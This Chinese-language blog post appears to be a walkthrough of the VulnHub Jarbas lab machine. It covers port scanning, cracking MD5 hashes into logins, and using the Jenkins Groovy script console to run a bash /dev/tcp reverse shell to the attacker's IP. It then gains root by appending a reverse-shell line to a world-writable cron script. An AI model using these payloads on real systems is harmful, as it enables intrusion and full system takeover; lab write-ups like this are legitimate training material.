+++
date = '2026-10-24T17:43:53+08:00'
draft = false
title = '[VulnHub靶机]JARBAS渗透记录'
tags = ['渗透','Vulnhub','Jenkins','Groovy','crontab']
+++

## 信息收集

攻击机IP: 192.168.200.146
使用arp-scan发现靶机IP: 192.168.200.164

```shell
┌──(kali㉿kali)-[~/jarbas]
└─$ sudo arp-scan -l                              
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 192.168.200.146
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.200.1   00:50:56:c0:00:08       VMware, Inc.
192.168.200.2   00:50:56:fc:41:2a       VMware, Inc.
192.168.200.164 00:0c:29:61:88:39       VMware, Inc.
192.168.200.254 00:50:56:ec:d0:be       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.004 seconds (127.74 hosts/sec). 4 responded
```

进行快速全端口扫描

```shell
┌──(kali㉿kali)-[~/jarbas]
└─$ sudo nmap -sT --min-rate 10000 -p- 192.168.200.164         
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-24 17:49 +0800
Nmap scan report for 192.168.200.164
Host is up (0.00049s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
8080/tcp open  http-proxy
MAC Address: 00:0C:29:61:88:39 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.82 seconds
```

对出现的端口进行全端口扫描

```shell
┌──(kali㉿kali)-[~/jarbas]
└─$ sudo nmap -sT --min-rate 10000 -p- 192.168.200.164 -oA nmapscan/ports
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-24 17:50 +0800
Nmap scan report for 192.168.200.164
Host is up (0.00053s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
8080/tcp open  http-proxy
MAC Address: 00:0C:29:61:88:39 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.74 seconds
```

对存在的端口进行深度扫描

```shell
┌──(kali㉿kali)-[~/jarbas]
└─$ sudo nmap -sT -sV -sC -p22,80,3306,8080 192.168.200.164 -oA nmapscan/detail
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-24 17:51 +0800
Nmap scan report for 192.168.200.164
Host is up (0.00032s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 28:bc:49:3c:6c:43:29:57:3c:b8:85:9a:6d:3c:16:3f (RSA)
|   256 a0:1b:90:2c:da:79:eb:8f:3b:14:de:bb:3f:d2:e7:3f (ECDSA)
|_  256 57:72:08:54:b7:56:ff:c3:e6:16:6f:97:cf:ae:7f:76 (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Jarbas - O Seu Mordomo Virtual!
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
8080/tcp open  http    Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/
MAC Address: 00:0C:29:61:88:39 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.16 seconds
```

对开放的端口进行漏洞扫描

```shell
┌──(kali㉿kali)-[~/jarbas]
└─$ sudo nmap --script=vuln -p22,80,3306,8080 192.168.200.164 -oA nmapscan/vuln
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-24 18:38 +0800
Nmap scan report for 192.168.200.164
Host is up (0.00040s latency).

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
|_http-trace: TRACE is enabled
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.200.164
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.200.164:80/
|     Form id: wmtb
|     Form action: /web/submit
|     
|     Path: http://192.168.200.164:80/
|     Form id: 
|     Form action: /web/20020720170457/http://jarbas.com.br:80/user.php
|     
|     Path: http://192.168.200.164:80/
|     Form id: 
|_    Form action: /web/20020720170457/http://jarbas.com.br:80/busca/
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-sql-injection: ERROR: Script execution failed (use -d to debug)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|_  /icons/: Potentially interesting folder w/ directory listing
3306/tcp open  mysql
8080/tcp open  http-proxy
| http-enum: 
|_  /robots.txt: Robots file
MAC Address: 00:0C:29:61:88:39 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 37.29 seconds
```

访问80端口, 发现是个古老Web页面, 但里面的链接都指向外部网站, 而且搜索和登录功能都不能用

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Jarbas/%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3.avif)

对其进行目录爆破, 发现access.html

```shell
┌──(kali㉿kali)-[~/jarbas]
└─$ dirsearch -u http://192.168.200.164/ -i 200,301,302,500 -e php,html
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, html | HTTP method: GET | Threads: 25 | Wordlist size: 9893

Output File: /home/kali/jarbas/reports/http_192.168.200.164/__26-10-24_19-50-22.txt

Target: http://192.168.200.164/

[19:50:23] Starting: 
[19:50:25] 200 -  359B  - /access.html                                      
                                                                             
Task Completed
```

## 漏洞利用

访问/access.html发现三个md5

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Jarbas/%E8%AE%BF%E9%97%AEaccess.avif)

使用[somd5](https://www.somd5.com/)进行解密, 得到3个凭据  
tiago: italia99  
trindade: marianna  
eder: vipsu

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Jarbas/%E8%A7%A3%E5%AF%86tiago.avif)

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Jarbas/%E8%A7%A3%E5%AF%86trindade.avif)

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Jarbas/%E8%A7%A3%E5%AF%86eder.avif)

访问8080端口, 发现是一个登录框

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Jarbas/%E8%AE%BF%E9%97%AE8080%E7%AB%AF%E5%8F%A3.avif)

使用上面得到的凭据登录, 最终使用最后一个成功登录

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Jarbas/%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F.avif)

点击左侧的Build Executor Status, 可以显示系统信息

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Jarbas/BES.avif)

点击master后, 注意到左侧的Script Console

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Jarbas/%E5%8F%91%E7%8E%B0ScriptConsole.avif)

点击后发现可以执行Groovy script代码

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Jarbas/%E8%84%9A%E6%9C%AC%E6%8E%A7%E5%88%B6%E5%8F%B0.avif)

上网搜了一下该语言执行系统命令的语法, 构建以下命令反弹shell:

```Groovy
def proc = ["bash", "-c", "bash -i >&/dev/tcp/192.168.200.146/4444 0>&1"].execute()
```

点击执行, 成功拿到shell

```shell
┌──(kali㉿kali)-[~/jarbas]
└─$ rlwarp nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.200.146] from (UNKNOWN) [192.168.200.164] 33974
bash: no job control in this shell
bash-4.2$ id
id
uid=997(jenkins) gid=995(jenkins) groups=995(jenkins) context=system_u:system_r:initrc_t:s0
```

## 权限提升

终端升级

```shell
bash-4.2$ python -c "import pty;pty.spawn('/bin/bash')"
```

查看定时任务, 发现每隔5分钟会以root身份运行/etc/script/CleaningScript.sh

```shell
bash-4.2$ cat /etc/crontab
cat /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
*/5 * * * * root /etc/script/CleaningScript.sh >/dev/null 2>&1
```

过去看看, 发现我们有写权限

```shell
bash-4.2$ cd /etc/script/
bash-4.2$ ls -la
ls -la
total 16
drwxr-xr-x.  2 root root   31 Apr  1  2018 .
drwxr-xr-x. 83 root root 8192 Oct 24 07:38 ..
-rwxrwxrwx.  1 root root   50 Apr  1  2018 CleaningScript.sh
```

那么我们可以把它修改为一个反弹shell脚本, 这样5分钟一过就会自动连接我们的攻击机

读取内容

```shell
bash-4.2$ cat CleaningScript.sh
cat CleaningScript.sh
#!/bin/bash
rm -rf /var/log/httpd/access_log.txt
```

追加恶意命令

```shell
bash-4.2$ echo 'bash -c "bash -i >&/dev/tcp/192.168.200.146/5555 0>&1"' >> CleaningScript.sh
```

等待5分钟后, 即可拿到shell

```shell
┌──(kali㉿kali)-[~/jarbas]
└─$ rlwrap nc -lvnp 5555
listening on [any] 5555 ...
connect to [192.168.200.146] from (UNKNOWN) [192.168.200.164] 52644
bash: no job control in this shell
[root@jarbas ~]# whoami
whoami
root
[root@jarbas ~]#
```

读取flag

```shell
[root@jarbas ~]# cd /root
cd /root
[root@jarbas ~]# ls
ls
flag.txt
[root@jarbas ~]# cat flag.txt
cat flag.txt
Hey!

Congratulations! You got it! I always knew you could do it!
This challenge was very easy, huh? =)

Thanks for appreciating this machine.

@tiagotvrs
```
